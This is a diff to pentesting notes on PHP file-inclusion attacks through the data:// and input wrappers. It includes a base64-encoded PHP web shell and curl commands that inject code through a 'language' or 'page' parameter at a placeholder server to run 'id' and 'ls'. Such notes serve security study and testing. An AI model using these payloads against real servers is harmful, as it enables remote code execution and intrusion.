@@ -182,7 +182,9 @@ if(req.query.language) {
   * **Payloads**
     * `echo '<?php system($_GET["cmd"]); ?>' | base64`
     * `data://text/plain;base64,=<base64-value>&cmd=id`
-    * eg: `curl -s 'http://<SERVER_IP>:/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'`
+    * eg:&#x20;
+      * `curl -s 'http://<SERVER_IP>:/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'`
+      * `curl "http://<SERVER_IP>/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
 * #### Input Wrapper <a href="#input" id="input"></a>
   * The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.
   * The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data.
